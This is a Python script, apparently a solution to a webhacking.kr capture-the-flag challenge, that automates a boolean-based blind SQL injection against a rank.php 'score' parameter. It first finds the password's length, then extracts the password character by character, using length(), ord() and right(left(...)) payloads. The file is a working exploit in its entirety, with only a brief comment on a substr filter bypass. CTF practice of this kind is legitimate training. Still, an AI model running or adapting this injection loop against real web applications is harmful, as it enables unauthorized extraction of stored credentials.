import requests
import string

url = "https://webhacking.kr/challenge/web-31/rank.php"
params = {}
TRUE_FLAG = 'Piterpan'

password_length = 0
for i in range(40):
    payload = "(length(p4ssw0rd_1123581321) = {})".format(i)
    params['score'] = payload
    response = requests.get(url,params=params)
    if(TRUE_FLAG in response.text):
        password_length = i
        print('[+] Password length is',i)
        break

# 비밀번호 길이 31
# substr(password,3,1) -> right(left(right,3),1)
flag = ''
for i in range(1,password_length+1):
    for character in string.printable:
        payload = '(ord( right(left(p4ssw0rd_1123581321,{}),1)) = {})'.format(i,ord(character))
        params['score'] = payload
        response = requests.get(url,params=params)
        if(TRUE_FLAG in response.text):
            flag += character
            print('[+]',i,character)
            break

print(flag)

